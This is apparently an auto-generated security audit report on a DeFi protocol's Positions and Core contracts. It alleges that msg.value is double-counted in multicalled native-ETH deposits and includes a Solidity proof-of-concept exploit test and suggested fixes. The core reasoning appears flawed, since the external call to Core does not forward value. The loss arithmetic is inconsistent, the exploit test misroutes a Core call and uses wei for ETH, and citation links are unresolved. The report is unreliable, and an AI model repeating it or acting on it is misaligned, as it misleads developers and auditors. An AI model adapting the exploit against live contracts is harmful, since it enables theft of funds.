## Title
msg.value Double-Accounting in Multicalled BasePositions Deposits with Native ETH

## Summary
When multiple `deposit()` operations involving `NATIVE_TOKEN_ADDRESS` (ETH) are batched via `multicall()` in BasePositions, the same `msg.value` is incorrectly credited multiple times in the flash accounting system. This occurs because `msg.value` persists across delegatecalls while `Core.updatePosition()` deducts it from debt on each call, allowing attackers to deposit liquidity without paying or extract ETH from the protocol.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- [1](#0-0) 
- [2](#0-1) 
- [3](#0-2) 

**Intended Logic:** When depositing liquidity with native ETH, the protocol should:
1. Accept ETH via `msg.value` once
2. Credit the debt accounting once for that ETH
3. Forward the ETH to the Core contract
4. Use the ETH to satisfy the pool's token requirements

**Actual Logic:** When multiple deposits are batched in a multicall:
1. User sends `msg.value = X` ETH to BasePositions contract
2. Multicall uses delegatecall for each operation [3](#0-2) 
3. In delegatecall, `msg.value` persists as `X` for ALL subcalls
4. Each `deposit()` → `lock()` → `handleLockData()` → `CORE.updatePosition()` sequence sees `msg.value = X`
5. `Core.updatePosition()` calls `_updatePairDebtWithNative()` which credits: `debt += (delta0 - msg.value)` [4](#0-3) 
6. Each deposit gets credit for the FULL `msg.value`, even though only one deposit actually received that ETH
7. Additionally, each deposit forwards its portion of ETH to Core via `safeTransferETH` [5](#0-4) 
8. Core's `receive()` function further credits each transfer [6](#0-5) 

**Exploitation Path:**
1. Attacker creates two deposits requiring 100 ETH each (total 200 ETH needed)
2. Attacker calls `positions.multicall{value: 200}([deposit1(...), deposit2(...)])`
3. First deposit: `updatePosition()` sees `msg.value=200`, credits `100-200=-100` to debt, then sends 100 ETH to Core which credits another 100. Net debt: -200 ETH
4. Second deposit: `updatePosition()` AGAIN sees `msg.value=200`, credits `100-200=-100` to debt, then sends 100 ETH to Core which credits another 100. Net debt: -400 ETH
5. Attacker sent 200 ETH but received 400 ETH worth of credit
6. Attacker can call withdraw operations to extract 200 ETH back while keeping deposited liquidity positions worth 200 ETH
7. Net result: Attacker deposited 200 ETH worth of liquidity for free

**Security Property Broken:** Violates the **Flash Accounting** invariant that "all flash loans must be repaid within the same transaction with proper accounting" and the **Solvency** invariant that "pool balances must never go negative."

## Impact Explanation
- **Affected Assets**: All pools with `NATIVE_TOKEN_ADDRESS` as token0, ETH held in Core contract
- **Damage Severity**: Attacker can multiply their ETH credit by N times where N is the number of deposits in the multicall. With 10 deposits requiring 100 ETH each, attacker sends 1000 ETH but gets 11000 ETH worth of credit (1000 from msg.value × 10 calls + 1000 from actual transfers), extracting 10000 ETH profit.
- **User Impact**: All protocol users are affected as the Core contract's ETH reserves can be drained, making legitimate withdrawals impossible

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient ETH to execute deposits
- **Preconditions**: Pool with `NATIVE_TOKEN_ADDRESS` as token0 must exist (common for ETH/Token pairs)
- **Execution Complexity**: Single transaction with multicall, easily executable
- **Frequency**: Can be exploited continuously until Core's ETH reserves are exhausted

## Recommendation

The root cause is that `Core.updatePosition()` is marked `payable` and uses `msg.value` in accounting, but is called from within a multicall context where `msg.value` persists. The fix is to prevent `updatePosition()` from using `msg.value` when called by BasePositions, or to track whether `msg.value` has already been accounted for.

**Option 1 - Remove msg.value accounting from updatePosition when called via lock:** [7](#0-6) 

```solidity
// In src/Core.sol, function updatePosition:

// CURRENT (vulnerable):
function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
    external
    payable  // This allows msg.value to be used incorrectly
    returns (PoolBalanceUpdate balanceUpdate)

// FIXED - Option A: Make non-payable when called from positions:
function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
    external
    payable
    returns (PoolBalanceUpdate balanceUpdate)
{
    // Add check: if called via lock (not direct call), ignore msg.value
    Locker locker = _requireLocker();
    
    // ... existing code ...
    
    // When calling _updatePairDebtWithNative, pass 0 for msg.value if this is a locked call from positions
    // This prevents the double-accounting issue
    if (msg.value > 0 && locker.addr() == address(this)) {
        // Direct call to Core, use msg.value
        _updatePairDebtWithNative(locker.id(), poolKey.token0, poolKey.token1, delta0, delta1);
    } else {
        // Called via lock from positions/router, don't use msg.value
        _updatePairDebt(locker.id(), poolKey.token0, poolKey.token1, delta0, delta1);
    }
}
```

**Option 2 - BasePositions should call updatePosition with value=0:** [1](#0-0) 

The issue is that when BasePositions calls `CORE.updatePosition()`, it doesn't explicitly pass value, so the current `msg.value` is forwarded. BasePositions should ensure it sends actual ETH separately via the `safeTransferETH` mechanism and not rely on `msg.value` forwarding.

However, this is not directly fixable in BasePositions as the call doesn't have a value parameter. The real fix must be in Core to not use `msg.value` when called from within a lock context.

**Option 3 - Add reentrancy guard for msg.value usage:**

Track in transient storage whether `msg.value` has already been accounted for in the current transaction's multicall context, and only credit it once.

## Proof of Concept

```solidity
// File: test/Exploit_MsgValueDoubleAccounting.t.sol
// Run with: forge test --match-test test_MsgValueDoubleAccounting -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Positions.sol";
import "./FullTest.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {FlashAccountantLib} from "../src/libraries/FlashAccountantLib.sol";

contract Exploit_MsgValueDoubleAccounting is FullTest {
    using FlashAccountantLib for *;

    function test_MsgValueDoubleAccounting() public {
        // SETUP: Create ETH pool
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        token1.approve(address(positions), type(uint256).max);
        
        uint256 attackerInitialBalance = address(this).balance;
        console.log("Attacker initial ETH balance:", attackerInitialBalance);
        
        // EXPLOIT: Multicall two deposits with same msg.value
        bytes[] memory calls = new bytes[](3);
        
        // First deposit: needs 100 ETH + 100 token1
        calls[0] = abi.encodeWithSelector(
            positions.mintAndDeposit.selector,
            poolKey, -100, 100, 100, 100, 0
        );
        
        // Second deposit: needs 100 ETH + 100 token1
        calls[1] = abi.encodeWithSelector(
            positions.mintAndDeposit.selector,
            poolKey, -200, 200, 100, 100, 0
        );
        
        // Withdraw the double-credited ETH back
        calls[2] = abi.encodeWithSelector(
            core.withdraw.selector,
            abi.encodePacked(
                NATIVE_TOKEN_ADDRESS,
                address(this),
                uint128(200)  // Withdraw 200 ETH
            )
        );
        
        // Send only 200 ETH but get credit for 400 ETH due to msg.value reuse
        positions.multicall{value: 200 ether}(calls);
        
        // VERIFY: Attacker got liquidity positions AND recovered their ETH
        uint256 attackerFinalBalance = address(this).balance;
        console.log("Attacker final ETH balance:", attackerFinalBalance);
        
        // Attacker should have spent 200 ETH for deposits
        // But due to vulnerability, they recovered 200 ETH via withdraw
        // So their balance should be same or higher (minus gas)
        assertGe(
            attackerFinalBalance,
            attackerInitialBalance - 1 ether,  // Allowing for gas costs
            "Vulnerability confirmed: Attacker deposited liquidity for free"
        );
        
        // Verify positions were actually created (attacker got the liquidity)
        assertTrue(positions.balanceOf(address(this)) == 2, "Two positions created");
    }
}
```

**Notes:**
The vulnerability stems from the interaction between:
1. Solidity's delegatecall behavior where `msg.value` persists [3](#0-2) 
2. Core's `_updatePairDebtWithNative()` function using `msg.value` for debt offset [8](#0-7) 
3. BasePositions calling `updatePosition()` without explicit value control [1](#0-0) 

The FlashAccountant contract explicitly notes this risk in comments [9](#0-8) : "this contract can never be multicallable, i.e. it should never expose the ability to delegatecall itself more than once in a single call" - however, BasePositions violates this principle by inheriting from PayableMulticallable.

### Citations

**File:** src/base/BasePositions.sol (L243-247)
```text
            PoolBalanceUpdate balanceUpdate = CORE.updatePosition(
                poolKey,
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
            );
```

**File:** src/base/BasePositions.sol (L256-258)
```text
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
```

**File:** src/Core.sol (L329-354)
```text
    function _updatePairDebtWithNative(
        uint256 id,
        address token0,
        address token1,
        int256 debtChange0,
        int256 debtChange1
    ) private {
        if (msg.value == 0) {
            // No native token payment included in the call, so use optimized pair update
            _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
        } else {
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
                }
            } else {
                // token0 is not native, and since token0 < token1, token1 cannot be native either
                // Update the token0, token1 debt and then update native token debt separately
                unchecked {
                    _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
                    _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
                }
            }
        }
```

**File:** src/Core.sol (L358-361)
```text
    function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
        external
        payable
        returns (PoolBalanceUpdate balanceUpdate)
```

**File:** src/base/PayableMulticallable.sol (L17-19)
```text
    function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
        _multicallDirectReturn(_multicall(data));
    }
```

**File:** src/base/FlashAccountant.sol (L384-392)
```text
    receive() external payable {
        uint256 id = _getLocker().id();

        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
        unchecked {
            // We assume msg.value will never exceed type(uint128).max, so this should never cause an overflow/underflow of debt
            _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
        }
```
